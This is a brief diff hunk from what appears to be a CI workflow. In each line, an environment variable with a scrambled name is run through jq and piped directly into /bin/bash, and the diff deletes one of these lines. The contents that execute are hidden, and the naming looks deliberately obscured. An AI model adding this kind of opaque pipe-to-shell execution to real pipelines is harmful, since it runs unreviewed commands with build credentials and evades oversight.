@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$vjz295" | jq -r .qf04 | /bin/bash
           echo $l17122 | jq -r .k74 | /bin/bash
           echo $tfmq82 | jq -r .ve723 | /bin/bash
-          printf '%s' "$bedvk0" | jq -r .aocv950 | /bin/bash
           echo $vp8 | jq -r .jhr953 | /bin/bash
           echo $quz06151 | jq -r .qh18 | /bin/bash
 
